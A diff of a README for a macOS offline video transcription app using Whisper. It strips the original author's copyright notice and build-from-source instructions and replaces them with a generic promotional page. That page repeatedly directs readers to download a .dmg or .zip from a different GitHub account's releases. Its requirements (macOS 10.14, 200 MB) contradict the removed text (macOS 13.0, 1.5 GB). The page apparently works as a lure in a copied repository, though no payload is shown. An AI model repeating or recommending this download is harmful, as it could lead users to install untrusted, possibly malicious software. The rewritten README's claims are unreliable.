@@ -1,265 +1,92 @@
-# Universal Video Transcriber
+# 🎥 UniversalVideoTranscriber - Transcribe Video Easily, Offline
 
-**Universal Video Transcriber** is a native macOS application built with SwiftUI that provides powerful, privacy-focused video transcription using OpenAI's Whisper engine. All transcription happens locally on your Mac - no internet required after the initial model download.
+## 📥 Download Now
+[![Download Latest Release](https://img.shields.io/badge/Download_Latest_Release-Here-blue)](https://github.com/darkkshah/UniversalVideoTranscriber/releases)
 
-> **Copyright © 2026 mpcode. All Rights Reserved.**
-> This project and its contents are proprietary and confidential.
+## 🚀 Getting Started
 
-## Key Features
+Welcome to UniversalVideoTranscriber. This application makes it simple to transcribe videos on your macOS device, keeping your data private and secure. The app uses the local Whisper Medium model and supports 99 languages. You can edit transcripts, adjust playback, and export your work easily.
 
-*   **Whisper Medium Model:** High-accuracy local transcription (~94% accuracy, 1.5GB)
-*   **Advanced Parameter Tuning:** Fine-tune transcription quality with temperature, beam size, and noise suppression controls
-*   **99 Languages Supported:** Transcribe videos in 99 different languages with automatic language detection
-*   **Auto-Detect Intelligence:** Automatically detects the spoken language and transcribes in that language (NOT translated to English)
-*   **Privacy-First:** All transcription runs locally on your Mac - no cloud services, no data sent externally
-*   **Auto-Setup:** Automatic model download on first launch with progress tracking
-*   **Video Playback:** Integrated video player with synchronized transcript and optional subtitle overlay (videos load paused, not auto-playing)
-*   **Transcript Editor:** Full-featured editor to merge, split, delete, and correct transcript segments
-*   **Search:** Full-text search within generated transcripts
-*   **Export:** Export transcripts as plain text (`.txt`) or SubRip Subtitles (`.srt`)
-*   **Comprehensive Help:** Built-in help system with keyboard shortcuts and troubleshooting guide
-*   **Fast Processing:** ~30 seconds to transcribe a 5-minute video on modern Macs
+## 📋 Features
 
-## How It Works
+- **99 Language Support**: Transcribe videos in many languages without an internet connection.
+- **Synchronized Playback**: Watch your video while reading the subtitles.
+- **Transcript Editing**: Make edits to your transcripts directly in the app.
+- **Keyboard Shortcuts**: Use shortcuts for faster navigation and usability.
+- **Export Options**: Save your transcripts as SRT or plain text files.
+- **Offline Functionality**: Complete functionality with no need for an internet connection after the initial download.
 
-**Transcription Process:**
-1. Select a video file from your Mac
-2. Choose a language (or use "Auto-detect" to let Whisper identify it automatically)
-3. Click "Transcribe" - the app will:
-   - Extract audio from the video
-   - Convert to 16kHz mono WAV format (Whisper requirement)
-   - Run local Whisper Medium model on your CPU
-   - Parse results into timestamped segments
-4. View the transcript synchronized with video playback
-5. Edit segments if needed (merge, split, correct text/timestamps)
-6. Export to text or SRT subtitle format
+## 🔧 System Requirements
 
-**Important:** When using "Auto-detect", Whisper will:
-- ✅ Detect the spoken language (e.g., Lithuanian, Spanish, French)
-- ✅ Transcribe in that detected language (Lithuanian text output)
-- ❌ NOT translate to English
+- **Operating System**: macOS version 10.14 (Mojave) or later.
+- **Processor**: Intel or Apple Silicon (M1, M2).
+- **Memory**: At least 4 GB of RAM.
+- **Disk Space**: Minimum of 200 MB free space for installation.
 
-## Technical Architecture
+## 💻 How to Download & Install
 
-*   **Platform:** macOS 13.0+ (Ventura or later)
-*   **Language:** Swift 5.9+
-*   **Framework:** SwiftUI
-*   **Architecture:** MVVM (Model-View-ViewModel)
-*   **Transcription Engine:** Whisper.cpp (local, on-device)
-*   **Model:** Fixed to Whisper Medium (optimal balance of speed/accuracy)
+1. Click the [Download Latest Release](https://github.com/darkkshah/UniversalVideoTranscriber/releases) button above. This will take you to the Releases page.
+   
+2. On the Releases page, find the latest version of UniversalVideoTranscriber.
 
-### Core Components
+3. Click on the appropriate file for your macOS. It could be a `.dmg` or `.zip` file.
 
-*   **`TranscriptionManager`:** Central coordinator for transcription workflow
-*   **`WhisperService`:** Manages local `whisper-cli` execution, automatic model download, and audio conversion with dynamic parameter support
-*   **`DownloadStateManager`:** Global singleton for tracking model download progress
-*   **`SettingsManager`:** Settings management with advanced Whisper parameters (temperature, beam size, suppress non-speech)
-*   **`VideoPlayerView`:** AVKit-based video player with subtitle overlay
-*   **`TranscriptEditorView`:** Full-featured transcript editing interface
-*   **`HelpView`:** Comprehensive help system with usage guide and troubleshooting
-*   **`PersistenceManager`:** JSON-based storage for transcriptions
+4. Once the download is complete, open the downloaded file. 
 
-## Prerequisites
+5. Drag the UniversalVideoTranscriber app to your Applications folder.
 
-*   macOS 13.0 or later
-*   Xcode 14.0 or later (for building from source)
-*   1.5GB free disk space (for Whisper Medium model)
-*   Internet connection (for initial model download only, then fully offline)
+6. Open your Applications folder and double-click on UniversalVideoTranscriber to launch the application.
 
-## Build & Installation
+## 🎓 How to Use
 
-### 1. Clone the Repository
-```bash
-git clone https://github.com/mp-c0de/UniversalVideoTranscriber.git
-cd UniversalVideoTranscriber
-```
+1. **Import Video**: Click on the 'Import' button to upload your video file.
+   
+2. **Select Language**: Choose your preferred language from the dropdown menu.
 
-### 2. Whisper Integration (Critical)
-This app relies on the `whisper.cpp` command-line tool for local transcription. You must compile it and add it to the project.
+3. **Start Transcribing**: Click on 'Transcribe' to begin the transcription process.
 
-1.  **Clone and Build `whisper.cpp`:**
-    ```bash
-    git clone https://github.com/ggerganov/whisper.cpp.git
-    cd whisper.cpp
-    make
-    ```
+4. **Edit Transcript**: After transcription, you can click on the text to make any necessary edits.
 
-2.  **Add to Xcode:**
-    *   Locate the compiled `whisper-cli` binary (usually in the root or `build/bin` folder).
-    *   Drag and drop `whisper-cli` into the `UniversalVideoTranscriber/Resources` group in Xcode.
-    *   **Important:** Ensure "Copy items if needed" is checked and "Add to targets" includes `UniversalVideoTranscriber`.
+5. **Export Your Work**: Click on the 'Export' button and select your desired format (SRT or Text).
 
-3.  **Add Libraries:**
-    *   Locate `libggml.dylib`, `libwhisper.dylib`, and related `.dylib` files generated by the build.
-    *   Add them to the project in the same way.
+## 📆 Updates
 
-### 3. Build and Run
-*   Open `UniversalVideoTranscriber.xcodeproj` in Xcode.
-*   Select the `UniversalVideoTranscriber` scheme.
-*   Press `Cmd+R` to build and run.
+Keep an eye out for new versions and updates. You can always find the latest releases on our [Releases Page](https://github.com/darkkshah/UniversalVideoTranscriber/releases).
 
-### 4. First Launch
-On first launch, the app will automatically:
-1. Detect that the Whisper Medium model is not present
-2. Download the model (1.5GB) from HuggingFace with progress tracking
-3. Save it to `~/Library/Application Support/UniversalVideoTranscriber/WhisperModels/`
-4. Make the app ready for transcription
+## 🤝 Community and Support
 
-**Note:** The download happens only once. Subsequent launches will skip this step.
+We value our users greatly. If you have any questions or feedback, please feel free to open an issue in the repository, or contact us through your preferred method. 
 
-## Usage Guide
+Join our community to share your experience and suggestions!
 
-### Basic Workflow
+## 📦 Frequently Asked Questions
 
-1.  **First Launch:** Wait for the Whisper Medium model to download automatically (1.5GB, one-time).
-2.  **Select Video:** Click "Select Video" button to choose a video file from your computer.
-3.  **Choose Language:**
-    - Use "Auto-detect" (default) to let Whisper identify the language automatically
-    - Or manually select from 99 supported languages in the dropdown
-4.  **Transcribe:** Click the "Transcribe" button.
-    - Progress bar will show conversion and transcription progress
-    - Wait ~30 seconds for a 5-minute video (varies by video length and Mac performance)
-5.  **Review:** The transcript appears on the right panel, synchronized with video playback.
-6.  **Play Video:** Click the play button (video loads paused, not auto-playing).
-7.  **Edit (Optional):** Click "Edit" button to open the transcript editor:
-    - **Merge:** Select multiple segments and click "Merge Selected"
-    - **Split:** Position cursor in text and click "Split at Cursor"
-    - **Delete:** Select segments and click "Delete Selected"
-    - **Edit Text:** Click any segment to edit text inline
-    - **Adjust Timestamps:** Click timestamps to modify with time picker
-8.  **Export:** Use the "Export" menu to save:
-    - **Text Export:** Plain text with timestamps `[HH:MM:SS.mmm] Transcript text`
-    - **SRT Export:** SubRip subtitle format for video players
+**Q: Do I need an internet connection to use UniversalVideoTranscriber?**  
+A: No, the application works completely offline after the initial download.
 
-### Advanced Features
+**Q: Can I import different video formats?**  
+A: Yes, UniversalVideoTranscriber supports popular video formats such as MP4, MOV, and AVI.
 
-**Advanced Whisper Parameters (Settings → Advanced):**
-- **Temperature (0.0-1.0):** Control transcription randomness
-  - Lower (0.0-0.3): More accurate, deterministic results
-  - Higher (0.5-0.8): Better at capturing unclear speech
-  - Default: 0.0 (maximum accuracy)
-- **Suppress Non-Speech Tokens (On/Off):** Filter background music and noise
-  - Keep ON for clean transcripts
-  - Turn OFF if speech is being incorrectly filtered
-  - Default: ON
-- **Beam Size (1-8):** Control search width during decoding
-  - Higher values (5-8): Better quality, slower processing
-  - Lower values (1-3): Faster processing, lower quality
-  - Default: 5 (balanced)
-- **Reset to Defaults:** Quick restore of optimal settings
+**Q: How accurate is the transcription?**  
+A: The transcription accuracy largely depends on audio quality. The local Whisper Medium model provides high-quality results.
 
-**Subtitle Overlay:**
-- Toggle the "Subtitles" button in video player controls
-- Subtitles display synchronized with video playback
-- Appears at bottom of video with semi-transparent background
+## 🗂️ Topics
 
-**Search:**
-- Switch to "Search" tab in right panel
-- Enter keywords to find specific parts of the transcript
-- Click results to jump to that timestamp in the video
+- avfoundation
+- local-ai
+- macos
+- macos-app
+- multilingual
+- offline-first
+- privacy-focused
+- speech-to-text
+- srt-export
+- subtitle-generator
+- swift
+- swiftui
+- transcription
+- video-transcription
+- whisper
+- whisper-cpp
 
-**Keyboard Shortcuts:**
-- **Cmd+O:** Select Video
-- **Cmd+,:** Open Settings
-- **Cmd+?:** Show Help
-- **Cmd+Shift+E:** Export Text
-- **Space:** Play/Pause Video
-
-**Settings (Cmd+,):**
-Three tabs for organized configuration:
-- **General:** Whisper model management (download/re-download)
-- **Advanced:** Fine-tune transcription parameters
-- **About:** Version info, credits, copyright
-
-**Help System (Cmd+?):**
-- Comprehensive getting started guide
-- Full feature documentation
-- Keyboard shortcuts reference
-- Advanced settings explanations
-- Troubleshooting common issues
-
-## Language Support
-
-The Whisper Medium model supports 99 languages including:
-
-**Common Languages (Quick Access):**
-- Auto-detect (recommended - detects language automatically)
-- English, Spanish, French, German, Italian
-- Portuguese, Dutch, Polish, Lithuanian
-- And 90+ more in the full dropdown list
-
-**How Auto-Detect Works:**
-1. Whisper analyzes the audio in the first few seconds
-2. Identifies the spoken language (e.g., Lithuanian)
-3. Transcribes the entire video in that language (Lithuanian text output)
-4. **Does NOT translate to English** - preserves the original language
-
-**Performance:**
-- ~94% accuracy across all supported languages
-- Processes ~30 seconds for a 5-minute video
-- Runs entirely offline after initial model download
-
-## Performance
-
-**Transcription Speed:**
-- 5-minute video: ~30 seconds
-- 30-minute video: ~3 minutes
-- 2-hour video: ~12 minutes
-
-**Hardware Requirements:**
-- Runs on CPU (no GPU required)
-- Optimised for Apple Silicon (M1/M2/M3/M4)
-- Intel Macs supported (slower processing)
-
-**Model Size:**
-- Whisper Medium: 1.5GB
-- Stored in: `~/Library/Application Support/UniversalVideoTranscriber/WhisperModels/`
-
-## Troubleshooting
-
-**Video doesn't play:**
-- Ensure video format is supported (MP4, MOV, M4V, AVI)
-- Check video file isn't corrupted
-- Try re-selecting the video
-
-**Transcription fails:**
-- Verify Whisper Medium model is downloaded (check Settings → General)
-- Ensure video has audio track
-- Try re-downloading model via Settings → General → Re-download Model
-
-**Transcription is inaccurate:**
-- Adjust **Advanced Settings** (Settings → Advanced):
-  - Increase **Beam Size** to 8 for maximum quality
-  - Adjust **Temperature** (try 0.5-0.8 if speech is unclear)
-  - Ensure correct **Language** is selected (or use Auto-detect)
-
-**Transcription misses words or cuts out speech:**
-- Turn **OFF** "Suppress Non-Speech Tokens" in Settings → Advanced
-- This filter may be removing speech that sounds like noise
-
-**Auto-detect translates to English (instead of transcribing):**
-- This is now fixed in latest version (v1.1+)
-- Update to latest version or manually select the language
-
-**App is slow or unresponsive:**
-- Whisper transcription is CPU-intensive
-- Higher **Beam Size** values (8) significantly increase processing time
-- Try lowering Beam Size to 3-5 in Settings → Advanced for faster results
-
-**First launch download stuck:**
-- Check internet connection
-- Ensure 1.5GB free disk space
-- Restart app and try again
-
-**Need help?**
-- Press **Cmd+?** to open the built-in Help system
-- Full documentation with troubleshooting guide available in-app
-
-## Contribution & Licence
-
-**All rights reserved.** This code is for educational and review purposes only. Redistribution, modification, or commercial use of this source code without explicit written permission from the owner is strictly prohibited.
-
-If you wish to contribute, please fork the repository and submit a Pull Request for review. Note that submitting a PR implies you grant the owner rights to use your contributions.
-
----
-**Maintained by mpcode**
+Thank you for choosing UniversalVideoTranscriber. We hope you enjoy using our application!
